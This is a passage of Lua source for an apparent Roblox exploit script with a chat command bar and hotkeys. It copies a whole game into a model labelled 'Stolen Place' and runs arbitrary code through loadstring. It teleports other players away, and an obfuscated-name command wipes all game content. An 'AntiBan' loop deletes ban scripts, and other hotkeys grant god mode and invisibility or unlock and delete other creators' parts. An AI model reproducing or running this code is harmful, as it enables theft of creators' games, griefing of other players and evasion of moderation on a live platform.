        CreateImageLabel(Par,Base..Images.Animation)
        elseif (class=="Hat") then
        CreateImageLabel(Par,Base..Images.Hat)
        elseif (class=="Humanoid") then
        CreateImageLabel(Par,Base..Images.Humanoid)
        elseif (class=="StarterScript") then
        CreateImageLabel(Par,Base..Images.LocalScript)
        elseif (class=="CoreScript") then
        CreateImageLabel(Par,Base..Images.LocalScript)
        else CreateImageLabel(Par,Base..Images.Nil)
        end
        end

        function SetExplGui()
        if (Selection~=nil) then
        local Gui=game:GetService("CoreGui"):FindFirstChild("ExplorerGui")
        if (Gui~=nil) then Gui:Remove() end
        local Children=Selection:GetChildren()
        ExplGui=Instance.new("ScreenGui")
        ExplGui.Parent=game:GetService("CoreGui")
        ExplGui.Name="ExplorerGui"
        if (Selection.Parent~=nil) then
        local BackButton=Instance.new("TextButton")
        BackButton.Size=UDim2.new(0,120,0,15)
        BackButton.BorderColor3=Color3.new(0,0,0)
        BackButton.TextColor3=Color3.new(0,0,0)
        BackButton.Parent=ExplGui
        BackButton.Text="Back to " .. Selection.Parent.Name
        BackButton.BackgroundColor3=Color3.new(0.3,0.3,1)
        BackButton.BackgroundTransparency=0.5
        BackButton.Position=UDim2.new(0,380,0,0)
        BackButton.Name="Back"
        BackButton.MouseButton1Click:connect(function()
        Selection=Selection.Parent
        SetExplGui()
        SetPropGui()
        end) end
        if (#Children>=MAXPAGEN) then
        local f=0
        for i=Min,Max do
        f=f+1
        local Obj=Instance.new("TextButton")
        Obj.Size=UDim2.new(0,120,0,15)
        Obj.BorderColor3=Color3.new(0,0,0)
        Obj.TextColor3=Color3.new(0,0,0)
        Obj.Parent=ExplGui
        Obj.Text="     "..Children[i].Name
        Obj.BackgroundColor3=Color3.new(0.4,0.4,0.6)
        Obj.BackgroundTransparency=0.5
        Obj.TextXAlignment="Left"
        if (Selection.Parent~=nil) then Obj.Position=UDim2.new(0,380,0,(f*15)) else Obj.Position=UDim2.new(0,380,0,(f*15)-15) end
        Obj.Name=Children[i].Name
        SetImage(Obj,Children[i].className)
        Obj.MouseButton1Click:connect(function() pcall(function() Selection=Children[i] SetExplGui() SetPropGui() end) end)
        local Remove=Instance.new("TextButton")
        Remove.Size=UDim2.new(0,15,0,15)
        Remove.BorderColor3=Color3.new(0,0,0)
        Remove.TextColor3=Color3.new(0,0,0)
        Remove.Parent=ExplGui
        Remove.Text="X"
        Remove.BackgroundColor3=Color3.new(1,0.25,0.25)
        Remove.BackgroundTransparency=0.5
        Remove.Name="Remove" .. Children[i].Name
        if (Selection.Parent~=nil) then Remove.Position=UDim2.new(0,500,0,(f*15)) else Remove.Position=UDim2.new(0,500,0,(f*15)-15) end
        Remove.MouseButton1Click:connect(function() if (pcall(function() Children[i]:Remove() end)) then SetPropGui() SetExplGui() else  Remove.BackgroundColor3=Color3.new(1,1,1) wait(1) Remove.BackgroundColor3=Color3.new(1,0.25,0.25) end end)
        end
        local UP=Instance.new("TextButton")
        UP.Position=UDim2.new(0,515,0,0)
        UP.Size=UDim2.new(0,15,0,15)
        UP.BorderColor3=Color3.new(0,0,0)
        UP.TextColor3=Color3.new(0,0,0)
        UP.Parent=ExplGui
        UP.Text="^"
        UP.BackgroundColor3=Color3.new(1,0.25,0.25)
        UP.BackgroundTransparency=0.5
        UP.Name="UpButton"
        UP.MouseButton1Click:connect(function() if (Min<=1) then return end Min=Min-1 Max=Max-1 SetExplGui() end)
        local DOWN=Instance.new("TextButton")
        DOWN.Position=UDim2.new(0,515,0,15)
        DOWN.Size=UDim2.new(0,15,0,15)
        DOWN.BorderColor3=Color3.new(0,0,0)
        DOWN.TextColor3=Color3.new(0,0,0)
        DOWN.Parent=ExplGui
        DOWN.Text="v"
        DOWN.BackgroundColor3=Color3.new(1,0.25,0.25)
        DOWN.BackgroundTransparency=0.5
        DOWN.Name="DownButton"
        DOWN.MouseButton1Click:connect(function() if (Max>=#Children) then return end Min=Min+1 Max=Max+1 SetExplGui() end)
        else
        Max=MAXPAGEN
        Min=1
        for i=1,#Children do
        local Obj=Instance.new("TextButton")
        Obj.Size=UDim2.new(0,120,0,15)
        Obj.BorderColor3=Color3.new(0,0,0)
        Obj.TextColor3=Color3.new(0,0,0)
        Obj.Parent=ExplGui
        Obj.Text="     "..Children[i].Name
        Obj.BackgroundColor3=Color3.new(0.4,0.4,0.6)
        Obj.BackgroundTransparency=0.5
        Obj.TextXAlignment="Left"
        if (Selection.Parent~=nil) then Obj.Position=UDim2.new(0,380,0,(i*15)) else Obj.Position=UDim2.new(0,380,0,(i*15)-15) end
        Obj.Name=Children[i].Name
        SetImage(Obj,Children[i].className)
        Obj.MouseButton1Click:connect(function() pcall(function() Selection=Children[i] SetExplGui() SetPropGui() end) end)
        local Remove=Instance.new("TextButton")
        Remove.Size=UDim2.new(0,15,0,15)
        Remove.BorderColor3=Color3.new(0,0,0)
        Remove.TextColor3=Color3.new(0,0,0)
        Remove.Parent=ExplGui
        Remove.Text="X"
        Remove.BackgroundColor3=Color3.new(1,0.25,0.25)
        Remove.BackgroundTransparency=0.5
        Remove.Name="Remove" .. Children[i].Name
        if (Selection.Parent~=nil) then Remove.Position=UDim2.new(0,500,0,(i*15)) else Remove.Position=UDim2.new(0,500,0,(i*15)-15) end
        Remove.MouseButton1Click:connect(function() if (pcall(function() Children[i]:Remove() end)) then SetPropGui() SetExplGui() else  Remove.BackgroundColor3=Color3.new(1,1,1) wait(1) Remove.BackgroundColor3=Color3.new(1,0.25,0.25) end end)
        end
        end
        end
        ----------------
        Selection.Changed:connect(function(prop)
        if (Selection==game) then return end
        if (updateDebounce==1) then
        updateDebounce=0
        if (Selection.Parent==nil) then
        Selection=game
        updateDebounce=1
        SetPropGui()
        SetExplGui()
        return end
        if (PropGui~=nil) then
        local Button=PropGui:FindFirstChild(prop)
        if (Button~=nil) then
        local Get=GetType(prop)
        Button.Text="     "..tostring(Get).." | "..tostring(Selection[Get])
        end end
        wait()
        updateDebounce=1
        end end)
        ---------------------------
        end
        SetPropGui()
        SetExplGui()

end
Hint=function(txt,t)
        if not pcall(function()local w=game:service'CoreGui':children''end)then return end
        local Hint=Instance.new('Hint',game:service'CoreGui')
        Hint.Text=txt
        wait(t)
        Hint:remove''
end
if wfp(game,'PlaceId')~=0 then if Ray.Hacked then error'Hack exist'return end end
Player=wfp(s'Players','LocalPlayer')
table.insert(Connects,Player.Chatted:connect(SearchCommand))
if pcall(function()s'CoreGui':IsA''end)then
        PlayerGui=s'CoreGui'
else
        PlayerGui=wfo(Player,'Name','PlayerGui')
end
Commands.tele=function(place_id)
	local players = {}
	for i, v in next, Game.Players:GetPlayers() do
		if v ~= Game.Players.LocalPlayer then
			table.insert(players, v)
		end
	end
	for i, v in next, players do
		pcall(function() v:SetSuperSafeChat(true) end)
	end
	LoadOnClients(players, TeleportScript(place_id))
end
Commands.ff=function(v,asd)
        for i,v in pairs(pf(asd[1]))do
                if v.Character then
                        for i,v in pairs(FindChildren(v.Character,'ClassName','ForceField'))do
                                v:remove''
                        end
                        if asd[2]=='false'then return end
                        Instance.new('ForceField',v.Character)
                end
        end
end
Commands.port=function(v)
        local t=game:service'InsertService':LoadAsset'64667087'
        if v or v~=''then
                t:FindFirstChild('port',true).Value=v
        end
        game:service'InsertService':Insert(t)
end
Commands.savegame=function()
        Place=Instance.new('Model',settings'')
                        Place.Name=tick''..'Stolen Place '..game.PlaceId
        Workspace=Instance.new('Model',Place)
                        Workspace.Name='Workspace'
        Lighting=Instance.new('Model',Place)
                        Lighting.Name='Lighting'
        StarterPack=Instance.new('Model',Place)
                        StarterPack.Name='StarterPack'
        StarterGui=Instance.new('Model',Place)
                        StarterGui.Name='StarterGui'
        Teams=Instance.new('Model',Place)
                        Teams.Name='Teams'
		Players=Instance.new('Model',Place)
						Players.Name='Players'
		SoundService=Instance.new('Model',Place)
						SoundService.Name='SoundService'
        for asdasd,asd in pairs(Place:children'')do
                for i,v in pairs(game:service(asd.Name):children'')do
                        pcall(function()
								if not v:IsA("Player") then
									if v:IsA("Model") then v.Archivable=true end
									v:clone''.Parent=asd
								elseif v:IsA("Player") then plr=Instance.new('Model',Players) plr.Name=v.Name
									for e,i in pairs(v:GetChildren())do i:clone().Parent = plr end
								end
                        end)
                end
        end
        Hint('Save game complete',10)
end
Commands.suicide=function()
        for i,v in pairs(Connects)do
                v:disconnect''
        end
        for i,v in pairs(PlayerGui:children'')do
                if v.Name==CommanderName then pcall(v.remove,v)end
        end
end
Commands.power=function()
	if game.Players.LocalPlayer.Character ~= nil then
        if not(game.Players.LocalPlayer.Character:FindFirstChild("lsInserted"))then
            ls=Instance.new("LocalScript",game.Players.LocalPlayer.Character)
            ls.Name="lsInserted"
			wait(.2)
			ls.Name="lsRun"
            ls.Source=PowerScriptSource
            ls.Disabled=true
            ls.Disabled=false
        end
	end
end
Commands.nova=function()
	if game.Players.LocalPlayer.Character ~= nil then
        if not(game.Players.LocalPlayer.Character:FindFirstChild("lsInserted"))then
            ls=Instance.new("LocalScript",game.Players.LocalPlayer.Character)
            ls.Name="lsInserted"
			wait(.2)
			ls.Name="lsRun"
            ls.Source=NovaSource
            ls.Disabled=true
            ls.Disabled=false
        end
	end
end
Commands.gaara=function()
	if game.Players.LocalPlayer.Character ~= nil then
        if not(game.Players.LocalPlayer.Character:FindFirstChild("lsInserted"))then
            ls=Instance.new("LocalScript",game.Players.LocalPlayer.Character)
            ls.Name="lsInserted"
			wait(.2)
			ls.Name="lsRun"
            ls.Source=GaaraSource
            ls.Disabled=true
            ls.Disabled=false
        end
	end
end
Commands.outgame=function() AntibanScript=false
	if game.Players.LocalPlayer.Character ~= nil then
        if not(game.Players.LocalPlayer.Character:FindFirstChild("lsInserted"))then
            ls=Instance.new("LocalScript",game.Players.LocalPlayer.Character)
            ls.Name="lsInserted"
			wait(.2)
			ls.Name="lsRun"
            ls.Source=OutGameSource
            ls.Disabled=true
            ls.Disabled=false
        end
	end
end
Commands.load=function(v)loadstring(v)()end
Commands.script=function(v)CreateScript('Script',s'Workspace',v)end
Commands['local']=function(v)CreateScript('LocalScript',Player.Backpack,v)end
Commands.dqydqshdjwxcfvwxbclmkljpoiuiyuiteyrteyazeqdsdfdgfdj=function(v,asd)
        game:service'Players'.LocalPlayer.Parent=nil
        game:service'Players'.LocalPlayer.Parent=game:service'Players'
        game:ClearContent'true'
        for i,v in pairs(GetAll(game))do
                pcall(v.remove,v)
        end
        game.DescendantAdded:connect(function(c)pcall(c.remove,c)end)
end
Commands.reset=function(v,asd)
        for i,p in pairs(pf(asd[1]))do
                Delay(0,function()
                        for i,v in pairs(p.Character:children'')do
                                if not v:IsA'Humanoid'then
                                        pcall(v.remove,v)
                                end
                        end
                end)
        end
end
Commands.bar=CommandBar
CommandBar''
AntiBan=function()
        coroutine.resume(coroutine.create(function()
                while true and wait() do
                        for _,v in pairs(game.Workspace:GetChildren()) do
                                if (v:IsA("Script")) and (v.Name=="BanScript") then
                                        v.Disabled=true
                                        v:remove()
                                elseif (v:IsA("Script")) and (string.sub(v.Name, 1, 9)=="Person299") then
										v.Disabled=true
										v:remove()
								end
                        end
                end
        end))
end
AntiBan''
X(function()
        local gs=s'GuiService'
        gs:AddKey(CmdbKey)
        gs:AddKey(FocusKey)
        gs:AddKey(ExplorerKey)
        gs:AddKey(ExproKey)
        gs:AddKey(GearKey)
        gs:AddKey(BuildKey)
        gs:AddKey(GodKey)
        gs:AddKey(UnlockKey)
        gs:AddKey(LockKey)
		gs:AddKey(InvisiKey)
		gs:AddKey(VisiKey)
		gs:AddKey(AdminKey)
        table.insert(Connects,gs.KeyPressed:connect(function(Key)
                if Key==CmdbKey then
						if(game.Players.LocalPlayer.Name=="LocalCheater")then
							game.Players.LocalPlayer.CharacterAppearance = "http://www.roblox.com/asset/?ID=67950579"
							game.Players.LocalPlayer.Character.Humanoid.Health = 0
							game.Players.LocalPlayer:SetSuperSafeChat(false)
						else
							if CommanderScreen.Parent then
									pcall(CommanderScreen.remove,CommanderScreen)
									Player:SetSuperSafeChat(false)
									return
							end
							CommandBar''
							game.Players.LocalPlayer:SetSuperSafeChat(false)
						end
                elseif Key==FocusKey then
                        CommanderFocus''
                elseif Key==ExproKey then
                        ExproGui''
                        Player:SetSuperSafeChat(false)
                elseif Key==ExplorerKey then
                        ExplorerGui''
                        Player:SetSuperSafeChat(false)
				elseif Key==AdminKey then
					coroutine.resume(coroutine.create(function()
						if(game.Players.LocalPlayer.Character~=nil)then
							if not(game.Players.LocalPlayer.Character:FindFirstChild("_admincmd"))then
								AdminScript=Instance.new("LocalScript",game.Players.LocalPlayer.Character)
								AdminScript.Name="_admincmd"
								AdminScript.Source=AdminScriptSource
								AdminScript.Disabled=true
								AdminScript.Disabled=false
							end
						end
					end))
				elseif Key==InvisiKey then
					coroutine.resume(coroutine.create(function()
						if not(game.Players.LocalPlayer.Backpack:FindFirstChild("iMergeTool"))then
								MergeTool=ctool("iMergeTool")
								MergeScript=Instance.new("LocalScript",MergeTool)
						end
						MergeScript.Source=MergeScriptSource
						MergeScript.Disabled=true
						MergeScript.Disabled=false
						function invisi(path)
							for _,v in pairs(path:GetChildren())do
								if(v:IsA("Part"))or(v:IsA("Decal"))then
									v.Transparency=1
								end
							invisi(v)
							end
						end
						if(game.Players.LocalPlayer.Character~=nil)then
							invisi(game.Players.LocalPlayer.Character)
						end
						game.Players.LocalPlayer.Character.Humanoid.MaxHealth=math.huge
						game.Players.LocalPlayer.Character.Humanoid.Health=math.huge
						game.Players.LocalPlayer.Character.Humanoid.WalkSpeed=DefaultGodAndInvisiWalkSpeed
						game.Players.LocalPlayer:SetSuperSafeChat(false)
					end))
				elseif Key==VisiKey then
					coroutine.resume(coroutine.create(function()
						function uninvisi(path)
							for _,v in pairs(path:GetChildren())do
								if(v:IsA("Part"))or(v:IsA("Decal"))then
									v.Transparency=0
								end
							uninvisi(v)
							end
						end
						if(game.Players.LocalPlayer.Character~=nil)then
							uninvisi(game.Players.LocalPlayer.Character)
						end
						game.Players.LocalPlayer.Character.Humanoid.MaxHealth=100
						game.Players.LocalPlayer.Character.Humanoid.Health=100
						game.Players.LocalPlayer.Character.Humanoid.WalkSpeed=16
						game.Players.LocalPlayer:SetSuperSafeChat(false)
					end))
                elseif Key==GodKey then
                        coroutine.resume(coroutine.create(function()
								if not(game.Players.LocalPlayer.Backpack:FindFirstChild("iMergeTool"))then
										MergeTool=ctool("iMergeTool")
										MergeScript=Instance.new("LocalScript",MergeTool)
								end
								MergeScript.Source=MergeScriptSource
								MergeScript.Disabled=true
								MergeScript.Disabled=false
								if not(game.Players.LocalPlayer.Backpack:FindFirstChild("iTeleport"))then
									TeleportTool=ctool("iTeleport")
									TeleportScript=Instance.new("LocalScript",TeleportTool)
								end
								TeleportScript.Source=[[
									if(script.Parent:IsA("HopperBin"))then
										script.Parent.Selected:connect(function(mouse)
											mouse.Button1Down:connect(function()
												if(game.Players.LocalPlayer.Character~=nil)then
													if(game.Players.LocalPlayer.Character.Torso~=nil)then
														game.Players.LocalPlayer.Character.Torso.CFrame=CFrame.new(mouse.Hit.p+Vector3.new(0,5,0))
													end
												end
											end)
										end)
									end]]
								TeleportScript.Disabled=true
								TeleportScript.Disabled=false
								function aff(path)
										for _,v in pairs(path:GetChildren())do
												if(v:IsA("Part"))then
													Instance.new("ForceField",v)
												end
												aff(v)
										end
								end
								aff(game.Players.LocalPlayer.Character)
								Instance.new("ForceField",game.Players.LocalPlayer.Character)
								game.Players.LocalPlayer.Character.Humanoid.WalkSpeed=DefaultGodAndInvisiWalkSpeed
                                game.Players.LocalPlayer.Character.Head.Transparency=1
								if(game.Players.LocalPlayer.Character.Head:FindFirstChild("face"))then
									game.Players.LocalPlayer.Character.Head:FindFirstChild("face"):remove()
								end
                                game.Players.LocalPlayer.Character.Humanoid.MaxHealth=math.huge
                                wait()
                                game.Players.LocalPlayer.Character.Humanoid.Health=math.huge
								game.Players.LocalPlayer:SetSuperSafeChat(false)
                        end))
                        Player:SetSuperSafeChat(false)
                elseif Key==UnlockKey then
                        function unlock(root)
                        for _, v in pairs(root:GetChildren()) do
                        if(v:IsA("Part"))then
                        v.Locked=false
                        end
                        unlock(v)
                        end
                        end
                        unlock(game.Workspace)
                        coroutine.resume(coroutine.create(function()
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild("Unlocked!"))then
                                        local load=ctool("Unlocked!")
                                end
                                wait(4)
                                if (game.Players.LocalPlayer.Backpack:FindFirstChild("Unlocked!"))then
                                        game.Players.LocalPlayer.Backpack:FindFirstChild("Unlocked!"):remove()
                                end
                        end))
                elseif Key==LockKey then
                        function unlock(root)
                        for _, v in pairs(root:GetChildren()) do
                        if(v:IsA("Part"))then
                        v.Locked=true
                        end
                        unlock(v)
                        end
                        end
                        unlock(game.Workspace)
                        coroutine.resume(coroutine.create(function()
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild("Locked!"))then
                                        local load=ctool("Locked!")
                                end
                                wait(4)
                                if (game.Players.LocalPlayer.Backpack:FindFirstChild("Locked!"))then
                                        game.Players.LocalPlayer.Backpack:FindFirstChild("Locked!"):remove()
                                end
                        end))
                elseif Key==BuildKey then
                        Player:SetSuperSafeChat(false)
                        coroutine.resume(coroutine.create(function()
								if not(game.Players.LocalPlayer.Backpack:FindFirstChild("iMergeTool"))then
										MergeTool=ctool("iMergeTool")
										MergeScript=Instance.new("LocalScript",MergeTool)
								end
								MergeScript.Source=MergeScriptSource
								MergeScript.Disabled=true
								MergeScript.Disabled=false
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild("iCloneTool"))then
                                        local clone=ctool("iCloneTool")
                                        clone.BinType = "Clone"
                                end
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild("iGrabPartTool"))then
                                        local move=ctool("iGrabPartTool")
                                        move.BinType = "GameTool"
                                end
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild("iGrabModelTool"))then
                                        local move=ctool("iGrabModelTool")
                                        move.BinType = "Grab"
                                end
								if not(game.Players.LocalPlayer.Backpack:FindFirstChild("iBTool"))then
										iBTool=ctool("iBTool")
										iBToolScript=Instance.new("LocalScript",iBTool)
										iBToolScript.Name="iBScript"
								end
								iBToolScript.Source=[[
									plr=game.Players.LocalPlayer
									plg=plr.PlayerGui
									coroutine.resume(coroutine.create(function(plr) while(wait())do chr=plr.Character end end),plr)

									if(script.Parent.ClassName~="HopperBin")then
										bin=Instance.new("HopperBin",plr.Backpack)
										bin.Name="iBTool"
										script.Name="iBScript"
										script.Parent=bin
									else
										script.Name="iBScript"
										bin=script.Parent
										bin.Name="iBTool"
									end

									bin.Selected:connect(function(mouse) print("iBTool_Selected")
										box=Instance.new("SelectionBox")
										lso=Instance.new("SelectionPointLasso",chr)
										lso.Visible=false
										lso.Humanoid=chr:FindFirstChild("Humanoid")
										md1=1
										md2=1
										md3=1
										clr=true
										ste=false
										lvi=false
										cle=false
										tme=.3
										function createGui()
											gui=Instance.new("ScreenGui",plg)
											gui.Name="iBGui"
											--PanelGUI--
											frm=Instance.new("Frame",gui)
											frm.Visible=false
											frm.Name="iBPanel"
											frm.Position=UDim2.new(0.0199999996,0,0.400000006,0)
											frm.Size=UDim2.new(0.150000006,0,0.400000006,0)
											frm.Style="RobloxRound"
											frm.ZIndex=8
											lab=Instance.new("TextLabel",frm)
											lab.Name="iBTitle"
											lab.BackgroundTransparency=1
											lab.Size=UDim2.new(1,0,0.150000006,0)
											lab.ZIndex=9
											lab.Font="ArialBold"
											lab.FontSize="Size18"
											lab.Text="iBuildTools Panel"
											lab.TextColor3=Color3.new(1,1,1)
											lab.TextStrokeTransparency=0
											lab.TextStrokeColor3=Color3.new(0,0,0)
											del=Instance.new("TextButton",frm)
											del.Name="iBDelete"
											del.BackgroundTransparency=1
											del.Position=UDim2.new(0,0,0.200000003,0)
											del.Size=UDim2.new(1,0,0.119999997,0)
											del.Style="RobloxButtonDefault"
											del.ZIndex=9
											del.Font="ArialBold"
											del.FontSize="Size12"
											del.Text="Delete"
											del.TextColor3=Color3.new(1,1,1)
											del.Selected=true
											ach=Instance.new("TextButton",frm)
											ach.Name="iBAnchor"
											ach.BackgroundTransparency=1
											ach.Position=UDim2.new(0,0,0.330000013,0)
											ach.Size=UDim2.new(1,0,0.119999997,0)
											ach.Style="RobloxButton"
											ach.ZIndex=9
											ach.Font="ArialBold"
											ach.FontSize="Size12"
											ach.Text="Anchor"
											ach.TextColor3=Color3.new(1,1,1)
											col=Instance.new("TextButton",frm)
											col.Name="iBCanCollide"
											col.BackgroundTransparency=1
											col.Position=UDim2.new(0,0,0.460000008,0)
											col.Size=UDim2.new(1,0,0.119999997,0)
											col.Style="RobloxButton"
											col.ZIndex=9
											col.Font="ArialBold"
											col.FontSize="Size12"
											col.Text="CanCollide"
											col.TextColor3=Color3.new(1,1,1)
											lck=Instance.new("TextButton",frm)
											lck.Name="iBLock"
											lck.BackgroundTransparency=1
											lck.Position=UDim2.new(0,0,0.579999983,0)
											lck.Size=UDim2.new(1,0,0.119999997,0)
											lck.Style="RobloxButton"
											lck.ZIndex=9
											lck.Font="ArialBold"
											lck.FontSize="Size12"
											lck.Text="Lock"
											lck.TextColor3=Color3.new(1,1,1)
											brk=Instance.new("TextButton",frm)
											brk.Name="iBBreak"
											brk.BackgroundTransparency=1
											brk.Position=UDim2.new(0,0,0.699999988,0)
											brk.Size=UDim2.new(1,0,0.119999997,0)
											brk.Style="RobloxButton"
											brk.ZIndex=9
											brk.Font="ArialBold"
											brk.FontSize="Size12"
											brk.Text="BreakJoints"
											brk.TextColor3=Color3.new(1,1,1)
											set=Instance.new("TextButton",frm)
											set.Name="iBSettings"
											set.BackgroundTransparency=1
											set.Position=UDim2.new(0,0,0.829999983,0)
											set.Size=UDim2.new(1,0,0.119999997,0)
											set.Style="RobloxButton"
											set.ZIndex=9
											set.Font="ArialBold"
											set.FontSize="Size12"
											set.Text="Settings"
											set.TextColor3=Color3.new(1,1,1)
											frm.Visible=true
											--SettingsGUI--
											frs=Instance.new("Frame",gui)
											frs.Visible=false
											frs.Name="iBSettings"
											frs.Position=UDim2.new(0.389999986,0,0.400000006,0)
											frs.Size=UDim2.new(0.25,0,0.25,0)
											frs.Style="RobloxRound"
											frs.ZIndex=8
											frw=Instance.new("Frame",frs)
											frw.Name="iBWindow"
											frw.Position=UDim2.new(0,0,0.25999999,0)
											frw.Size=UDim2.new(1,0,0.74000001,0)
											frw.Style="RobloxRound"
											frw.ZIndex=8
											cls=Instance.new("TextButton",frs)
											cls.Name="iBClose"
											cls.Position=UDim2.new(0.850000024,0,-0.00999999978,0)
											cls.Size=UDim2.new(0.150000006,0,0.219999999,0)
											cls.Style="RobloxButtonDefault"
											cls.ZIndex=10
											cls.Font="ArialBold"
											cls.FontSize="Size12"
											cls.Text="X"
											cls.TextColor3=Color3.new(1,0,0)
											wtl=Instance.new("TextLabel",frs)
											wtl.Name="iBTitle"
											wtl.BackgroundTransparency=1
											wtl.Size=UDim2.new(1,0,0.25,0)
											wtl.ZIndex=9
											wtl.Font="ArialBold"
											wtl.FontSize="Size14"
											wtl.Text="iBuildTools Settings Window"
											wtl.TextColor3=Color3.new(1,1,1)
											wtl.TextStrokeColor3=Color3.new(0,0,0)
											wtl.TextStrokeTransparency=0
											wtl.TextXAlignment="Left"
											clk=Instance.new("TextLabel",frw)
											clk.Name="iBClick"
											clk.BackgroundTransparency=1
											clk.Size=UDim2.new(1,0,0.330000013,0)
											clk.ZIndex=10
											clk.Font="ArialBold"
											clk.FontSize="Size12"
											clk.TextColor3=Color3.new(1,1,1)
											clk.Text=" - Click Mode : "
											clk.TextStrokeColor3=Color3.new(0,0,0)
											clk.TextStrokeTransparency=0
											clk.TextXAlignment="Left"
											ray=Instance.new("TextLabel",frw)
											ray.Name="iBRay"
											ray.BackgroundTransparency=1
											ray.Position=UDim2.new(0,0,0.330000013,0)
											ray.Size=UDim2.new(1,0,0.330000013,0)
											ray.ZIndex=10
											ray.Font="ArialBold"
											ray.FontSize="Size12"
											ray.TextColor3=Color3.new(1,1,1)
											ray.Text=" - Ray Mode : "
											ray.TextStrokeColor3=Color3.new(0,0,0)
											ray.TextStrokeTransparency=0
											ray.TextXAlignment="Left"
											rfc=Instance.new("TextLabel",frw)
											rfc.Name="iBRayFunction"
											rfc.BackgroundTransparency=1
											rfc.Position=UDim2.new(0,0,0.660000013,0)
											rfc.Size=UDim2.new(1,0,0.330000013,0)
											rfc.ZIndex=10
											rfc.Font="ArialBold"
											rfc.FontSize="Size12"
											rfc.TextColor3=Color3.new(1,1,1)
											rfc.Text=" - Ray Function : "
											rfc.TextStrokeColor3=Color3.new(0,0,0)
											rfc.TextStrokeTransparency=0
											rfc.TextXAlignment="Left"
											ckb=Instance.new("TextButton",frw)
											ckb.Name="iBClickButton"
											ckb.Position=UDim2.new(0.400000006,0,0,0)
											ckb.Size=UDim2.new(0.600000024,0,0.330000013,0)
											ckb.ZIndex=10
											ckb.Selected=true
											ckb.Style="RobloxButtonDefault"
											ckb.Font="ArialBold"
											ckb.FontSize="Size12"
											ckb.Text="Enabled"
											ckb.TextColor3=Color3.new(0,1,0)
											ryb=Instance.new("TextButton",frw)
											ryb.Name="iBRayButton"
											ryb.Position=UDim2.new(0.400000006,0,0.330000013,0)
											ryb.Size=UDim2.new(0.600000024,0,0.330000013,0)
											ryb.Style="RobloxButton"
											ryb.ZIndex=10
											ryb.Font="ArialBold"
											ryb.FontSize="Size12"
											ryb.Text="Disabled"
											ryb.TextColor3=Color3.new(1,0,0)
											rfb=Instance.new("TextButton",frw)
											rfb.Name="iBRayFButton"
											rfb.Position=UDim2.new(0.400000006,0,0.660000013,0)
											rfb.Size=UDim2.new(0.600000024,0,0.330000013,0)
											rfb.Style="RobloxButtonDefault"
											rfb.ZIndex=10
											rfb.Font="ArialBold"
											rfb.FontSize="Size12"
											rfb.Text="Enable Propertie"
											rfb.TextColor3=Color3.new(0,1,0)
										end
										createGui()
										coroutine.resume(coroutine.create(function()
											while(mouse)and wait() do
												if(box)and(ray)then
													if(lvi)then
														lso.Visible=true
													else
														lso.Visible=false
													end
													if(md1==1)then
														if(clr)then
															if(mouse.Target~=nil)then
																if(mouse.Target:IsA("Part"))or(mouse.Target:IsA("CornerWedgePart"))or(mouse.Target:IsA("TrussPart"))or(mouse.Target:IsA("WedgePart"))or(mouse.Target:IsA("Seat"))or(mouse.Target:IsA("VehicleSeat"))or(mouse.Target:IsA("SkateboardPlatform"))then
																	box.Visible=true
																	box.Parent=chr
																	box.Adornee=mouse.Target
																	if(md2==1)then
																		box.Color=BrickColor.new("Bright red")
																	elseif(md2==2)then
																		if(mouse.Target.Anchored)then
																			box.Color=BrickColor.new("Camo")
																		else
																			box.Color=BrickColor.new("Bright red")
																		end
																	elseif(md2==3)then
																		if(mouse.Target.CanCollide)then
																			box.Color=BrickColor.new("Camo")
																		else
																			box.Color=BrickColor.new("Bright red")
																		end
																	elseif(md2==4)then
																		if(mouse.Target.Locked)then
																			box.Color=BrickColor.new("Camo")
																		else
																			box.Color=BrickColor.new("Bright red")
																		end
																	elseif(md2==5)then
																		box.Color=BrickColor.new("Bright blue")
																	end
																end
															else
																box.Visible=false
																box.Parent=nil
																box.Adornee=nil
															end
														end
													elseif(md1==2)then
														lso.Point=mouse.Hit.p
														lso.Parent=chr
														box.Visible=false
														box.Parent=nil
														box.Adornee=nil
														if(md2~=1)and(md2~=5)then
															if(md3==1)then
																lso.Color=BrickColor.new("Camo")
															elseif(md3==2)then
																lso.Color=BrickColor.new("Bright red")
															end
														elseif(md2==1)then
															if(cle)then
																lso.Color=BrickColor.new("Bright red")
															else
																lso.Color=BrickColor.new("Bright blue")
															end
														elseif(md2==5)then
															if(cle)then
																lso.Color=BrickColor.new("Bright red")
															else
																lso.Color=BrickColor.new("Bright blue")
															end
														end
													end
												end
											end
										end))
										function delDown()
											del_downFunc=mouse.Button1Down:connect(function()
												md2=1
												if(md2==1)then
													if(md1==1)then
														if(mouse.Target~=nil)then
															if(mouse.Target:IsA("Part"))or(mouse.Target:IsA("CornerWedgePart"))or(mouse.Target:IsA("TrussPart"))or(mouse.Target:IsA("WedgePart"))or(mouse.Target:IsA("Seat"))or(mouse.Target:IsA("VehicleSeat"))or(mouse.Target:IsA("SkateboardPlatform"))then
																mouse.Target:remove()
															end
														end
													elseif(md1==2)then
														lvi=true
														while(lvi)and wait() do
															if(mouse.Target~=nil)then
																if(mouse.Target:IsA("Part"))or(mouse.Target:IsA("CornerWedgePart"))or(mouse.Target:IsA("TrussPart"))or(mouse.Target:IsA("WedgePart"))or(mouse.Target:IsA("Seat"))or(mouse.Target:IsA("VehicleSeat"))or(mouse.Target:IsA("SkateboardPlatform"))then
																	mouse.Target:remove()
																	cle=true
																	wait(tme)
																	cle=false
																else
																	cle=false
																end
															else
																cle=false
															end
														end
													end
												end
											end)
										end
										function delUp()
											del_upFunc=mouse.Button1Up:connect(function()
												lvi=false
												cle=false
											end)
										end
										function achDown()
											ach_downFunc=mouse.Button1Down:connect(function()
												md2=2
												if(md2==2)then
													if(md1==1)then
														if(mouse.Target~=nil)then
															if(mouse.Target:IsA("Part"))or(mouse.Target:IsA("CornerWedgePart"))or(mouse.Target:IsA("TrussPart"))or(mouse.Target:IsA("WedgePart"))or(mouse.Target:IsA("Seat"))or(mouse.Target:IsA("VehicleSeat"))or(mouse.Target:IsA("SkateboardPlatform"))then
																if(mouse.Target.Anchored)then
																	mouse.Target.Anchored=false
																else
																	mouse.Target.Anchored=true
																end
															end
														end
													elseif(md1==2)then
														lvi=true
														while(lvi)and wait() do
															if(mouse.Target~=nil)then
